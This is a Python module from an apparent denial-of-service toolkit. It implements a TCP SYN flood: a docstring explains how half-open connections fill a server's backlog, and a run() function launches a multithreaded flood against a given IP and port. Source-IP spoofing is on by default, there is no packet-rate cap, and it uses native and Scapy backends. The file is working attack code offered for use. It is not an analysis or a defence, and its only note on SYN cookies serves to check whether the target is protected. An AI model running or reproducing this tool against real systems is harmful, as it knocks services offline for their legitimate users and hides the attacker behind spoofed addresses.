"""
modules/syn_flood.py - UFOSYN
Classic TCP SYN flood: half-open connections exhaust server state tables.

How it works:
  1. Attacker sends SYN with spoofed source IP
  2. Server allocates TCB (Transmission Control Block), replies SYN-ACK
  3. SYN-ACK goes to spoofed IP (nobody home) -> connection stuck in SYN_RCVD
  4. Server's backlog fills (default 128-1024 slots)
  5. Legitimate SYNs get dropped -> effective DoS

Bypass note:
  SYN cookies mitigate this by encoding state in the ISN instead of allocating
  a TCB. Check with: sysctl net.ipv4.tcp_syncookies
"""

from floodles.core.sender import make_engine, NativeFloodEngine


def run(
    dst_ip: str,
    dst_port: int,
    threads: int = 16,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
    force_python: bool = False,
):
    """
    Launch SYN flood. Auto-selects C sendmmsg backend if available.

    Args:
        dst_ip       : Target IP address.
        dst_port     : Target TCP port.
        threads      : Worker count.
        pps_limit    : PPS cap. 0 = unlimited.
        duration     : Duration in seconds. 0 = run until stop().
        spoof        : Randomize source IP.
        force_python : Force Python backend (debug).

    Returns:
        FloodEngine or NativeFloodEngine (already started).
    """
    engine = make_engine(
        packet_fn=None,
        dst_ip=dst_ip,
        port=dst_port,
        pkt_type=NativeFloodEngine.PKT_SYN,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
        spoof=spoof,
        force_python=force_python,
    )

    # Python fallback: use Scapy/Rust packet builder
    if not isinstance(engine, NativeFloodEngine):
        from floodles.core.native_bridge import get_packet_builder
        builder = get_packet_builder()

        def make_packet() -> bytes:
            return builder.syn(dst_ip, dst_port, spoof=spoof)

        from floodles.core.sender import FloodEngine
        engine = FloodEngine(
            packet_fn=make_packet,
            dst_ip=dst_ip,
            threads=threads,
            pps_limit=pps_limit,
            duration=duration,
        )

    engine.start()
    return engine
